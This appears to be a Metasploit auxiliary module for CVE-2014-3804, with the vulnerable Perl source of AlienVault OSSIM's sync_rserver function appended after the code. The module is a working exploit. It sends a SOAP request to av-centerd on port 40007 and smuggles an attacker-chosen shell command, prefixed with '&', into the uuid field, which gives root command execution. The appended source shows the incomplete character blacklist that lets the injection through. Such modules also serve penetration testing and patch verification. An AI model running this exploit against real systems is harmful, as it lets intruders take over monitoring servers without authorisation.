 
class MetasploitModule < Msf::Auxiliary
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize
        super(
            &#039;Name&#039;        => &#039;Alienvault OSSIM av-centerd Util.pm sync_rserver Command Execution&#039;,
            &#039;Description&#039; => %q{
                This module exploits a command injection vulnerability found within the sync_rserver
                function in Util.pm. The vulnerability is triggered due to an incomplete blacklist
                during the parsing of the $uuid parameter. This allows for the escaping of a system
                command allowing for arbitrary command execution as root
            },
            &#039;References&#039;  =>
            [
                [ &#039;CVE&#039;, &#039;2014-3804&#039; ],
                [ &#039;ZDI&#039;, &#039;14-197&#039; ],
                [ &#039;URL&#039;, &#039;http://forums.alienvault.com/discussion/2690&#039; ],
            ],
            &#039;Author&#039;      => [ &#039;james fitts&#039; ],
            &#039;License&#039;     => MSF_LICENSE,
            &#039;DisclosureDate&#039; => &#039;Jun 11 2014&#039;)
 
        register_options([
            Opt::RPORT(40007),
            OptBool.new(&#039;SSL&#039;,   [true, &#039;Use SSL&#039;, true]),
            OptString.new(&#039;CMD&#039;, [ false, &#039;This is the file to download&#039;, &#039;touch /tmp/file.txt&#039;])
        ], self.class)
     
    end
 
    def run
 
        soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
        soap += "<soap:Envelope xmlns:soap=\"http:\/\/schemas.xmlsoap.org/soap/envelope/\"\r\n"
        soap += "xmlns:soapenc=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding/\" xmlns:xsd=\"http:\/\/www.w3.org\/2001\/XMLSchema\"\r\n"
        soap += "xmlns:xsi=\"http:\/\/www.w3.org\/2001\/XMLSchema-instance\"\r\n"
        soap += "soap:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\">\r\n"
        soap += "<soap:Body>\r\n"
        soap += "<sync_rserver xmlns=\"AV\/CC\/Util\">\r\n"
        soap += "<c-gensym3 xsi:type=\"xsd:string\">All</c-gensym3>\r\n"
        soap += "<c-gensym5 xsi:type=\"xsd:string\">& #{datastore[&#039;CMD&#039;]} </c-gensym5>\r\n"
        soap += "<c-gensym7 xsi:type=\"xsd:string\">#{datastore[&#039;RHOST&#039;]}</c-gensym7>\r\n"
        soap += "<c-gensym9 xsi:type=\"xsd:string\">#{Rex::Text.rand_text_alpha(4 + rand(4))}</c-gensym9>\r\n"
        soap += "</sync_rserver>\r\n"
        soap += "</soap:Body>\r\n"
        soap += "</soap:Envelope>\r\n"
 
        res = send_request_cgi(
            {
                &#039;uri&#039;   =>   &#039;/av-centerd&#039;,
                &#039;method&#039;    =>   &#039;POST&#039;,
                &#039;ctype&#039;     =>   &#039;text/xml; charset=UTF-8&#039;,
                &#039;data&#039;      =>   soap,
                &#039;headers&#039;   =>   {
                    &#039;SOAPAction&#039;    =>   "\"AV/CC/Util#sync_rserver\""
                }
            }, 20)
 
        if res && res.code == 200
            print_good("Command executed successfully!")
        else
            print_bad("Something went wrong...")
        end
 
    end
 
end
__END__
 
/usr/share/alienvault-center/lib/AV/CC/Util.pm
 
sub sync_rserver
{
    my ( $funcion_llamada, $nombre, $uuid, $admin_ip, $hostname ) = @_;
    verbose_log_file(
        "SYNC RSERVER TASK : Received call from $uuid : ip source = $admin_ip, hostname = $hostname:($funcion_llamada,$nombre)"
    );
 
    if ($uuid =~  /[;`\$\<\>\|]/) {
        console_log_file("Not allowed uuid: $uuid in sync_rserver\n");
        my @ret = ("Error");
        return \@ret;
    }
 
    my $conn = Avtools::get_database();
    my $sqlfile = "/tmp/sync_${uuid}.sql";
    my $sqlfile_old = "/tmp/sync_${uuid}.sql.old";
    my $sqlfile_md5 = `md5sum $sqlfile | awk &#039;{print \$1}&#039;`;
    my $sqlfile_content;
    my $status = 1;
    my $counter = 0;
    my @ret;
    my $query = qq{};
    my $dbq;
 
    if ( -f $sqlfile_old )
    {
        my $sqlfile_old_md5 = `md5sum $sqlfile_old | awk &#039;{print \$1}&#039;`;
        debug_log_file ("Old MD5: $sqlfile_old_md5 New MD5: $sqlfile_md5");
        if ( $sqlfile_md5 eq $sqlfile_old_md5 )
        {
            unlink $sqlfile;
            verbose_log_file ("Already sync&#039;ed!");
            return "0";
        }
        else
        {
            unlink $sqlfile_old;
        }
    }
 
    my $query_array = `ossim-db < $sqlfile 2>&1`;
    $query_array =~ s/[\s\n]+$//g;
    if ($query_array ne &#039;&#039;)
    {
        $status = $query_array;
    }
    else
    {
        $status = 0;
    }
 
    if ( ! (defined $status) or $status == 0 )
    {
        if ( grep /RESTART\sOSSIM\-SERVER/, $sqlfile )
        {
            verbose_log_file("RESTART OSSIM-SERVER MARK found. Restarting ossim-server");
            system(&#039;/etc/init.d/ossim-server restart&#039;);
        }
        else
        {
            debug_log_file("RESTART OSSIM-SERVER MARK not found. Skipping ossim-server restart");
        }
 
        $query = qq{REPLACE INTO alienvault.config (conf, value) VALUES (&#039;latest_asset_change&#039;, utc_timestamp())};
        debug_log_file($query);
        $dbq->execute();
        $dbq->finish();
    }
    else
    {
        verbose_log_file ("Error syncing rservers: ${status}");
    }
 
    debug_log_file("Move file: $sqlfile");
    move ($sqlfile, $sqlfile . ".old");
 
#    push @ret, "0";
    return "0";
}

